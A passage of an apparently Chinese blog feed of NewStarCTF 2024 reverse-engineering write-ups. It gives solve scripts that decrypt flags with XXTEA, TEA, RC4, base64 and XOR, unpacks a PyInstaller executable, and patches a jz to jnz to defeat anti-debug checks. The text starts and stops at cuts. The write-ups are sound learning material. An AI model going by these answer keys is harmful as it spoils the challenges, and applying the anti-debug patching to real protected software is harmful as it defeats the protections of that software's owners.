i,j,k;<br>    <span class="hljs-type">int</span> tmp;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>        sbox[i]=i;<br>    &#125;<br>    j=k=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++)&#123;<br>        tmp=sbox[i];<br>        j=(j+tmp+key[k])%<span class="hljs-number">256</span>;<br>        sbox[i]=sbox[j];<br>        sbox[j]=tmp;<br>        <span class="hljs-keyword">if</span>(++k&gt;=<span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span>*)key))<br>            k=<span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//解密rc4</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4</span><span class="hljs-params">(<span class="hljs-type">char</span> *key, <span class="hljs-type">char</span> *data)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i, j, k, R, tmp;<br><br>    <span class="hljs-built_in">init_sbox</span>(key);<br><br>    j = k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)data); i++)<br>    &#123;<br>        j = (j + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        k = (k + sbox[j]) % <span class="hljs-number">256</span>;<br><br>        tmp = sbox[j];<br>        sbox[j] = sbox[k];<br>        sbox[k] = tmp;<br><br>        R = sbox[(sbox[j] + sbox[k]) % <span class="hljs-number">256</span>];<br><br>        data[i] ^= R;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//解密 tea</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">btea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)<br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)<br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)<br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)<br>            &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//base解密</span><br><span class="hljs-type">char</span> base64[<span class="hljs-number">65</span>] = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decodeBase64</span><span class="hljs-params">(<span class="hljs-type">char</span> *str, <span class="hljs-type">int</span> len, <span class="hljs-type">char</span> **in)</span></span><br><span class="hljs-function"></span>&#123;<br><br>    <span class="hljs-type">char</span> ascill[<span class="hljs-number">129</span>];<br>    <span class="hljs-type">int</span> i,k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>    &#123;<br>        ascill[base64[i]] = k++;<br>    &#125;<br>    <span class="hljs-type">int</span> decodeStrlen = len / <span class="hljs-number">4</span> * <span class="hljs-number">3</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> *decodeStr= (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>) * decodeStrlen);<br>    k = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>    &#123;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">2</span>) | (ascill[str[++i]] &gt;&gt; <span class="hljs-number">4</span>);<br>        <span class="hljs-keyword">if</span> (str[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">4</span>) | (ascill[str[++i]] &gt;&gt; <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">if</span> (str[i + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;=&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        decodeStr[k++] = (ascill[str[i]] &lt;&lt; <span class="hljs-number">6</span>) | (ascill[str[++i]]);<br>    &#125;<br>    decodeStr[k] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>    *in = decodeStr;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> secrets[<span class="hljs-number">6</span>] =<br>            &#123;<span class="hljs-comment">//secrets数组</span><br>                    <span class="hljs-number">6866935238662214623LL</span>,<br>                    <span class="hljs-number">3247821795433987330LL</span>,<br>                    <span class="hljs-number">-3346872833356453065LL</span>,<br>                    <span class="hljs-number">1628153154909259154LL</span>,<br>                    <span class="hljs-number">-346581578535637655LL</span>,<br>                    <span class="hljs-number">3322447116203995091LL</span><br>            &#125;;<br>    <span class="hljs-built_in">btea</span>((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)secrets, <span class="hljs-number">-12</span>, (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)<span class="hljs-string">&quot;meow~meow~tea~~~&quot;</span>);<br>    <span class="hljs-type">char</span> *flag;<br>    <span class="hljs-built_in">decodeBase64</span>((<span class="hljs-type">char</span> *)secrets, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)secrets), &amp;flag);<br>    <span class="hljs-built_in">rc4</span>(<span class="hljs-string">&quot;rc4k4y&quot;</span>, (<span class="hljs-type">char</span> *)flag);<br>    <span class="hljs-built_in">puts</span>(flag);<br>&#125;<br></code></pre></td></tr></table></figure><p>好难好难好难 (((((T__T)))))</p><h1 id="PangBai-过家家（3）"><a href="#PangBai-过家家（3）" class="headerlink" title="PangBai 过家家（3）"></a>PangBai 过家家（3）</h1><p>发现附件是一个 python 编译的可执行文件，PyInstaller 是一个能把 <code>.py</code> 脚本打包成 <code>.exe</code> 的 python 库。</p><p><img src="https://img.dkdun.cn/v1/2024/12/fd9150cdeb260c60.png"></p><p>给它解包，可以使用 pyinstaller Extractor 进行解包。前提：1. 使用 pyinstaller 进行打包。2. 未加密</p><p>解包后文件放在以 exe 名字 +_extracted 的文件夹中</p><p><img src="https://img.dkdun.cn/v1/2024/12/0a2592d5412198ae.png"></p><p>找到和程序同名的 <code>NotNormalExe.pyc</code> 这个文件，用的 <a href="https://pylingual.io/">https://pylingual.io</a> 反编译它，反编译结果如下</p><p><img src="https://img.dkdun.cn/v1/2024/12/492a93c4478014b6.png"></p><p>就是一个简单的异或，重点是要解包反编译出来源码</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">40</span>, <span class="hljs-number">9</span>, <span class="hljs-number">22</span>, <span class="hljs-number">52</span>, <span class="hljs-number">15</span>, <span class="hljs-number">56</span>, <span class="hljs-number">66</span>, <span class="hljs-number">71</span>, <span class="hljs-number">111</span>, <span class="hljs-number">121</span>,<br>       <span class="hljs-number">90</span>, <span class="hljs-number">33</span>, <span class="hljs-number">18</span>, <span class="hljs-number">40</span>, <span class="hljs-number">3</span>, <span class="hljs-number">13</span>, <span class="hljs-number">80</span>, <span class="hljs-number">28</span>, <span class="hljs-number">65</span>, <span class="hljs-number">68</span>, <span class="hljs-number">83</span>,<br>       <span class="hljs-number">88</span>, <span class="hljs-number">34</span>, <span class="hljs-number">86</span>, <span class="hljs-number">5</span>, <span class="hljs-number">12</span>, <span class="hljs-number">35</span>, <span class="hljs-number">82</span>, <span class="hljs-number">67</span>, <span class="hljs-number">3</span>, <span class="hljs-number">17</span>, <span class="hljs-number">79</span><br>       ]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>key = <span class="hljs-string">&#x27;NewStar2024&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>     enc[i] ^= <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])<br>     flag += <span class="hljs-built_in">chr</span>(enc[i])<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>只关于 Reverse</category>
      
      <category>赛题复现</category>
      
      <category>NewStarCTF 2024</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2024 Week2</title>
    <link href="/2024/11/11/%E5%A4%8D%E7%8E%B02/"/>
    <url>/2024/11/11/%E5%A4%8D%E7%8E%B02/</url>
    
    <content type="html"><![CDATA[<p>有 Java 代码审计，好难，Java 我讨厌你qwq，但是我觉得这些题出得太好啦，复现完学到了很多！！！</p><span id="more"></span><h1 id="Pangbai-泰拉记（1）"><a href="#Pangbai-泰拉记（1）" class="headerlink" title="Pangbai 泰拉记（1）"></a>Pangbai 泰拉记（1）</h1><p>ida 打开反汇编查看，<code>flag</code> 和一个 <code>key</code> 异或</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  std::ostream *v0; <span class="hljs-comment">// rax</span><br>  std::ostream *v1; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+24h] [rbp+4h]</span><br><br>  <span class="hljs-built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_6D<span class="hljs-number">15E8</span>DE_Pangbai____1__Pangbai____1__1_cpp);<br>  v0 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(std::cout, <span class="hljs-string">&quot;Use your debugger to discover the hidden flag!&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v0, std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; ++i )<br>    flag[i] ^= key[i];<br>  v1 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(std::cout, <span class="hljs-string">&quot;Click on the flag to obtain?&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v1, std::endl&lt;<span class="hljs-type">char</span>,std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>对 <code>key</code> 交叉引用能看见还没 <code>main0</code> 函数调用，进去看看</p><p><img src="https://img.dkdun.cn/v1/2024/12/15b058a1dd2841b6.png"></p><p>发现有两个函数 <code>IsDebuggerPresent()</code> 和 <code>CheckRemoteDebuggerPresent()</code>，这是两个反调试函数</p><p><img src="https://img.dkdun.cn/v1/2024/12/2d0da2054ad0d700.png"></p><p>对于 <code>CheckRemoteDebuggerPresent()</code> 函数：</p><p><code>kernel32</code> 的 <code>CheckRemoteDebuggerPresent() </code>函数用于检测指定进程是否正在被调试. <code>Remote</code> 指同一个机器中的不同进程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">BOOL WINAPI CheckRemoteDebuggerPresent(<br>  _In_    HANDLE hProcess,<br>  _Inout_ PBOOL  pbDebuggerPresent<br>);<br></code></pre></td></tr></table></figure><p>如果说检测到正在被调试，那么 <code>pbDebuggerPresent</code> 指向的值会被设置为 <code>0xffffffff</code>。</p><p>对于这道题，调试一下可以看得出来流程，进程会跳转到右边这里，这里执行的是将 <code>key</code> 替换为不正确的 <code>key</code> ，所以可以将 <code>jz</code> 指令改为 <code>jnz</code> 指令，让程序跳转不了</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jz: </span><span class="hljs-keyword">Jump </span>if <span class="hljs-built_in">Zero</span>,零标志位 ZF=<span class="hljs-number">1</span> 时,<span class="hljs-keyword">jz </span>指令执行跳转<br><span class="hljs-keyword">jnz: </span><span class="hljs-keyword">Jump </span>if Not <span class="hljs-built_in">Zero</span>,零标志位 ZF=<span class="hljs-number">0</span> 时,<span class="hljs-keyword">jnz </span>指令执行跳转<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2024/12/82229bdabbecb98c.png"></p><p>然后进行调试</p><p><img src="https://img.dkdun.cn/v1/2024/12/c57b3908876d84ca.png"></p><p>提取数据，写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">flag = [<span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x69</span>,<br>        <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0x79</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x6D</span>,<br>        <span class="hljs-number">0x65</span>, <span class="hljs-number">0x3F</span>]<br>key = [<span class="hljs-number">0x05</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x5A</span>,<br>       <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x59</span>,<br>       <span class="hljs-number">0x26</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x09</span>,<br>       <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x42</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>):<br>    flag[i] ^= key[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag[i]), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="drink-tea"><a href="#drink-tea" class="headerlink" title="drink_tea"></a>drink_tea</h1><p>先读一遍流程，输入长度为 32 的字符串，进入 <code>sub_140001180</code>，然后再比较</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+20h] [rbp-28h]</span><br>  __int64 v5; <span class="hljs-comment">// [rsp+28h] [rbp-20h]</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please Input: \n&quot;</span>);<br>  <span class="hljs-built_in">sub_140001120</span>(<span class="hljs-string">&quot;%32s&quot;</span>, byte_140004700);<br>  v5 = <span class="hljs-number">-1</span>i64;<br>  <span class="hljs-keyword">do</span><br>    ++v5;<br>  <span class="hljs-keyword">while</span> ( byte_140004700[v5] );<br>  <span class="hljs-keyword">if</span> ( v5 == dword_140004078 )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; dword_140004078; i += <span class="hljs-number">8</span> )<br>      <span class="hljs-built_in">sub_140001180</span>(&amp;byte_140004700[i], aWelcometonewst);<br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">memcmp</span>(byte_140004700, &amp;unk_140004080, dword_140004078) )<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Right! \n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;wrong!&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong! \n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>进入 <code>sub_140001180</code> 函数查看</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">__int64</span> __fastcall sub_140001180(unsigned int *<span class="hljs-built_in">a1</span>, _DWORD *<span class="hljs-built_in">a2</span>)<br>&#123;<br>  __int64 result<span class="hljs-comment">; // rax</span><br>  unsigned int <span class="hljs-built_in">v3</span><span class="hljs-comment">; // [rsp+0h] [rbp-38h]</span><br>  unsigned int <span class="hljs-built_in">v4</span><span class="hljs-comment">; // [rsp+4h] [rbp-34h]</span><br>  int <span class="hljs-built_in">v5</span><span class="hljs-comment">; // [rsp+8h] [rbp-30h]</span><br>  unsigned int i<span class="hljs-comment">; // [rsp+Ch] [rbp-2Ch]</span><br><br>  <span class="hljs-built_in">v3</span> = *<span class="hljs-built_in">a1</span><span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v4</span> = <span class="hljs-built_in">a1</span>[<span class="hljs-number">1</span>]<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">v5</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 0x20; ++i )</span><br>  &#123;<br>    <span class="hljs-built_in">v5</span> -= <span class="hljs-number">1640531527</span><span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v3</span> += (<span class="hljs-built_in">a2</span>[<span class="hljs-number">1</span>] + (<span class="hljs-built_in">v4</span> &gt;&gt; <span class="hljs-number">5</span>)) ^ (<span class="hljs-built_in">v5</span> + <span class="hljs-built_in">v4</span>) ^ (*<span class="hljs-built_in">a2</span> + <span class="hljs-number">16</span> * <span class="hljs-built_in">v4</span>)<span class="hljs-comment">;</span><br>    <span class="hljs-built_in">v4</span> += (<span class="hljs-built_in">a2</span>[<span class="hljs-number">3</span>] + (<span class="hljs-built_in">v3</span> &gt;&gt; <span class="hljs-number">5</span>)) ^ (<span class="hljs-built_in">v5</span> + <span class="hljs-built_in">v3</span>) ^ (<span class="hljs-built_in">a2</span>[<span class="hljs-number">2</span>] + <span class="hljs-number">16</span> * <span class="hljs-built_in">v3</span>)<span class="hljs-comment">;</span><br>  &#125;<br>  *<span class="hljs-built_in">a1</span> = <span class="hljs-built_in">v3</span><span class="hljs-comment">;</span><br>  result = <span class="hljs-number">4</span>i64<span class="hljs-comment">;</span><br>  <span class="hljs-built_in">a1</span>[<span class="hljs-number">1</span>] = <span class="hljs-built_in">v4</span><span class="hljs-comment">;</span><br>  return result<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>看到这个加密流程就能发现是 tea 算法加密找到<code>key</code> 和输入的值直接逆</p><p><img src="https://img.dkdun.cn/v1/2024/12/22dcddbe3c87348b.png"></p><p>脚本如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span> <span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">uint32_t</span>* k)</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v0=v[<span class="hljs-number">0</span>], v1=v[<span class="hljs-number">1</span>], sum=<span class="hljs-number">0xC6EF3720</span>, i;  <br>    <span class="hljs-type">uint32_t</span> delta=<span class="hljs-number">0x9e3779b9</span>;                     <br>    <span class="hljs-type">uint32_t</span> k0=k[<span class="hljs-number">0</span>], k1=k[<span class="hljs-number">1</span>], k2=k[<span class="hljs-number">2</span>], k3=k[<span class="hljs-number">3</span>];   <br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">32</span>; i++) &#123;                         <br>        v1 -= ((v0&lt;&lt;<span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0&gt;&gt;<span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1&lt;&lt;<span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1&gt;&gt;<span class="hljs-number">5</span>) + k1);<br>        sum -= delta;<br>    &#125;                                              <br>    v[<span class="hljs-number">0</span>]=v0; v[<span class="hljs-number">1</span>]=v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i,j;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> flag[] = &#123;<span class="hljs-number">0x78</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x85</span>,<br><span class="hljs-number">0x59</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x07</span>, <br><span class="hljs-number">0xA8</span>,<span class="hljs-number">0xB9</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x24</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> keys[]=<span class="hljs-string">&quot;WelcomeToNewStar&quot;</span>;<br><br>    <span class="hljs-type">uint32_t</span> *v = (<span class="hljs-type">uint32_t</span>*)flag;<br>    <span class="hljs-type">uint32_t</span> *k = (<span class="hljs-type">uint32_t</span>*)keys;<br><br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">8</span>;i+=<span class="hljs-number">2</span>)&#123;<span class="hljs-comment">//每8个字节(2个 uint32)解密</span><br>        decrypt(v+i,k);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">32</span>;j++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,flag[j]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ezencrypt"><a href="#ezencrypt" class="headerlink" title="ezencrypt"></a>ezencrypt</h1><p>先查看 <code>MainActivity</code> 函数发现有加密逻辑，<code>Enc enc = new Enc(tx)</code>，那就去 <code>Enc</code> 函数看看</p><p><img src="https://img.dkdun.cn/v1/2024/12/2d292afff47f2193.png"></p><p><code>Enc</code> 的构造函数里进行第一次加密，<code>ECB</code> 模式的 